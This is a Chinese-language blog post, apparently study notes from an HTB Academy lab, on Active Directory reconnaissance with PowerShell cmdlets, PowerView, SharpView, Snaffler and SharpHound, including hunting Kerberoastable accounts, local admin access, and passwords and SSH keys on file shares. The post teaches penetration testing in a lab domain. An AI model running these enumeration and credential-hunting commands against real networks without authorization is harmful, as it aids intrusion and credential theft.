+<p>现在我们的模块已经加载完毕，让我们开始吧。首先，我们将使用 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addomain?view=windowsserver2022-ps">Get-ADDomain</a>枚举有关域的一些基本信息。</p>
+<h3 id="Get-Domain-Info"><a href="#Get-Domain-Info" class="headerlink" title="Get Domain Info"></a>Get Domain Info</h3><pre><code class="powershell-session">PS C:\htb&gt; Get-ADDomain
+</code></pre>
+<p>这将打印出有用的信息，如域SID、域功能级别、任何子域等。接下来，我们将使用Get-ADUser cmdlet。我们将筛选已填充ServicePrincipalName属性的帐户。</p>
+<h4 id="Get-ADUser"><a href="#Get-ADUser" class="headerlink" title="Get-ADUser"></a>Get-ADUser</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADUser -Filter &#123;ServicePrincipalName -ne &quot;$null&quot;&#125; -Properties ServicePrincipalName
+</code></pre>
+<p>我们可以使用ActiveDirectory模块运行的另一个有趣的检查是使用Get-ADTrust cmdlet验证域信任关系</p>
+<h4 id="Checking-For-Trust-Relationships"><a href="#Checking-For-Trust-Relationships" class="headerlink" title="Checking For Trust Relationships"></a>Checking For Trust Relationships</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADTrust -Filter *
+</code></pre>
+<p>此cmdlet将打印出域具有的任何信任关系。我们可以确定它们是我们林中的信任还是与其他林中的域的信任、信任类型、信任方向以及与之相关的域的名称。这将在以后利用父子信任关系和跨林信任进行攻击时非常有用。接下来，我们可以使用Get-ADGroup cmdlet收集AD组信息。</p>
+<h4 id="Group-Enumeration"><a href="#Group-Enumeration" class="headerlink" title="Group Enumeration"></a>Group Enumeration</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADGroup -Filter * | select name
+</code></pre>
+<p>我们可以获取结果，并将感兴趣的名称反馈到cmdlet中，以获取有关特定组的更详细信息，如下所示：</p>
+<h4 id="Detailed-Group-Info"><a href="#Detailed-Group-Info" class="headerlink" title="Detailed Group Info"></a>Detailed Group Info</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADGroup -Identity &quot;Backup Operators&quot;
+</code></pre>
+<p>现在我们了解了更多关于该组的信息，让我们使用get-ADGroupMember cmdlet获取成员列表。</p>
+<h3 id="Group-Membership"><a href="#Group-Membership" class="headerlink" title="Group Membership"></a>Group Membership</h3><pre><code class="powershell-session">PS C:\htb&gt; Get-ADGroupMember -Identity &quot;Backup Operators&quot;
+</code></pre>
+<p>接下来，我们将介绍PowerView工具，它具有许多简化枚举和深入挖掘领域的功能。</p>
+<h2 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h2><p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView</a></p>
+<p>PowerView是一个用PowerShell编写的工具，用于帮助我们在AD环境中获得情境感知。与BloodHound非常相似，它提供了一种识别用户在网络上登录位置的方法，枚举域信息，如用户、计算机、组、ACLS、信任、查找文件共享和密码、执行Kerberoasting等。它是一个用途广泛的工具，可以让我们深入了解客户领域的安全状况。与BloodHound相比，它需要更多的手动工作来确定域内的错误配置和关系，但如果使用得当，可以帮助我们识别细微的错误配置。</p>
+<h4 id="Domain-User-Information"><a href="#Domain-User-Information" class="headerlink" title="Domain User Information"></a>Domain User Information</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+</code></pre>
+<h4 id="Recursive-Group-Membership"><a href="#Recursive-Group-Membership" class="headerlink" title="Recursive Group Membership"></a>Recursive Group Membership</h4><pre><code class="powershell-session">PS C:\htb&gt;  Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse
+</code></pre>
+<p>上面我们对DomainAdmins组进行了递归查看，以列出其成员。现在我们知道了潜在特权提升的目标。与AD PowerShell模块一样，我们还可以枚举域信任映射。</p>
+<h4 id="Trust-Enumeration"><a href="#Trust-Enumeration" class="headerlink" title="Trust Enumeration"></a>Trust Enumeration</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-DomainTrustMapping
+</code></pre>
+<p>我们可以使用Test-AdminAccess功能在当前计算机或远程计算机上测试本地管理员访问。</p>
+<h4 id="Testing-for-Local-Admin-Access"><a href="#Testing-for-Local-Admin-Access" class="headerlink" title="Testing for Local Admin Access"></a>Testing for Local Admin Access</h4><pre><code class="powershell-session">PS C:\htb&gt; Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+
+ComputerName    IsAdmin
+------------    -------
+ACADEMY-EA-MS01    True 
+</code></pre>
+<p>上面，我们确定当前使用的用户是主机ACADEMY-EA-MS01上的管理员。我们可以对每个主机执行相同的功能，以查看我们在哪里可以进行管理访问。我们稍后将看到BloodHound执行这种检查的效果如何。现在，我们可以检查设置了SPN属性的用户，这表明该帐户可能受到Kerberoating攻击。</p>
+<h4 id="Finding-Users-With-SPN-Set"><a href="#Finding-Users-With-SPN-Set" class="headerlink" title="Finding Users With SPN Set"></a>Finding Users With SPN Set</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+</code></pre>
+<h2 id="SharpView"><a href="#SharpView" class="headerlink" title="SharpView"></a>SharpView</h2><p>Finding Users With SPN Set</p>
+<pre><code class="powershell-session">PS C:\htb&gt; .\SharpView.exe Get-DomainUser -Help
+</code></pre>
+<pre><code class="powershell-session">PS C:\htb&gt; .\SharpView.exe Get-DomainUser -Identity forend
+</code></pre>
+<h2 id="Shares"><a href="#Shares" class="headerlink" title="Shares"></a>Shares</h2><p>共享允许域中的用户快速访问与其日常角色相关的信息，并与组织共享内容。如果设置正确，域共享将要求用户加入域，并要求用户在访问系统时进行身份验证。权限也将到位，以确保用户只能访问和查看其日常角色所需的内容。过于宽松的共享可能会导致敏感信息的意外披露，尤其是那些包含医疗、法律、人事、人力资源、数据等的信息。在攻击中，获得对可以访问诸如IT&#x2F;基础设施共享之类的共享的标准域用户的控制可能导致诸如配置文件或诸如SSH密钥或密码之类的不安全存储的认证文件之类的敏感数据的泄露。我们希望发现任何类似的问题，以确保客户不会将任何数据暴露给日常工作中不需要访问的用户，并且他们符合任何法律&#x2F;法规要求（HIPAA、PCI等）。我们可以使用PowerView查找共享，然后帮助我们挖掘共享，或者使用各种手动命令查找常见字符串，如输入名称。这可能是一个乏味的过程，我们可能会错过一些东西，尤其是在大型环境中。现在，让我们花一些时间来探索Snafler工具，看看它如何帮助我们更准确、更高效地识别这些问题。</p>
+<h2 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h2><p><a target="_blank" rel="noopener" href="https://github.com/SnaffCon/Snaffler">Snaffler</a>是一种可以帮助我们在Active Directory环境中获取凭据或其他敏感数据的工具。Snafler的工作原理是获取域中的主机列表，然后枚举这些主机以获得共享和可读目录。一旦完成，它就会遍历用户可读的任何目录，并寻找可以帮助我们在评估中更好定位的文件。Snafler要求从加入域的主机或在域用户上下文中运行。 要执行Snafler，我们可以使用以下命令：</p>
+<h4 id="Snaffler-Execution"><a href="#Snaffler-Execution" class="headerlink" title="Snaffler Execution"></a>Snaffler Execution</h4><pre><code class="bash">Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
+</code></pre>
+<p>-s命令告诉它为我们将结果打印到控制台，-d指定要在其中搜索的域，-o命令则告诉Snafler将结果写入日志文件。-v选项是详细级别。通常，数据是最好的，因为它只在屏幕上显示结果，所以开始查看工具运行更容易。Snafler可以产生大量的数据，所以我们通常应该输出到文件中，让它运行，然后再返回。在渗透测试期间，将Snafler原始输出作为补充数据提供给客户也很有帮助，因为这可以帮助他们锁定应该首先锁定的高价值股票。</p>
+<pre><code class="powershell-session">PS C:\htb&gt; .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
+</code></pre>
+<p>我们可能会找到密码、SSH密钥、配置文件或其他可用于进一步访问的数据。Snafler为我们对输出进行颜色编码，并为我们提供共享中文件类型的概要。 既然我们有了关于INLANEFREIGHT.LOCAL域的丰富数据（希望能清除注释和日志文件输出！），我们需要一种方法来关联它并将其可视化。让我们深入了解BloodHound，看看这个工具在任何以AD为中心的安全评估中有多强大。</p>
+<h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>Bloodhound是一款出色的开源工具，可以通过分析对象之间的关系来识别AD环境中的攻击路径。</p>
+<p>我们必须从位于网络内（但未加入域）的Windows攻击主机中作为域用户进行身份验证，或者将工具转移到加入域的主机。</p>
+<h4 id="SharpHound-in-Action"><a href="#SharpHound-in-Action" class="headerlink" title="SharpHound in Action"></a>SharpHound in Action</h4><pre><code class="powershell-session">PS C:\htb&gt;  .\SharpHound.exe --help
+</code></pre>
+<p>我们将从MS01攻击主机运行SharpHound.exe收集器开始。</p>
+<pre><code class="powershell-session">PS C:\htb&gt; .\SharpHound.exe -c All --zipfilename ILFREIGHT
+</code></pre>
+<p>接下来，我们可以将数据集过滤到我们自己的虚拟机中，或者将其吸收到MS01上的BloodHound GUI工具中。</p>
+<p>有时，我们会看到主机不再通电，但仍显示为AD中的记录。在报告中提出建议之前，我们应该始终验证它们是否“活动”。我们可能会为遗留操作系统写一个高风险的发现，或者为清理AD中的旧记录写一个最佳实践建议。</p>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2023/10/20/sqli-lab-pass/" title="sqli-lab_pass"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: sqli-lab_pass</span></a><a class="button is-default" href="/2023/09/24/AD-2/" title="AD_2"><span class="has-text-weight-semibold">Next: AD_2</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
